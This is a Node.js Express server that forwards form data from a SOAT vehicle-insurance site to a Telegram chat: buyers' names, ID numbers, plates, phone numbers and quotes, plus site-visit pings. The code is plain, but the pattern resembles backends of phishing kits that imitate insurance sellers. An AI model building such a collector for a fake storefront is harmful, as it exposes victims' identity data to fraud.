const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/notificar', async (req, res) => {
  const { nombre, cedula, placa, telefono, tipo, clase, subtipo, valor, fecha } = req.body;

  let mensaje = '';

  if (tipo === 'cotizacion') {
    mensaje = `🧾 Nueva cotización:\nPlaca: ${placa}\nClase: ${clase}\nSubtipo: ${subtipo}\nValor estimado: ${valor}`;
  } else if (tipo === 'datos') {
    mensaje = `🚗 Nueva compra SOAT:\n\nNombre: ${nombre}\nCédula: ${cedula}\nPlaca: ${placa}\nTeléfono: ${telefono}\nValor cotizado: ${valor}`;
  } else if (tipo === 'visita') {
    mensaje = `👀 Nueva visita al sitio SOAT\nFecha: ${fecha || new Date().toLocaleString()}`;
  } else {
    mensaje = `📨 Nueva notificación:\nNombre: ${nombre}\nCédula: ${cedula}\nPlaca: ${placa}\nTeléfono: ${telefono}`;
  }

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
    });

    res.status(200).json({ ok: true, msg: 'Notificación enviada a Telegram' });
  } catch (error) {
    console.error('❌ Error enviando a Telegram:', error.response?.data || error.message);
    res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
  }
});

app.get('/', (req, res) => {
  res.send('Servidor de notificación SOAT funcionando 🚀');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
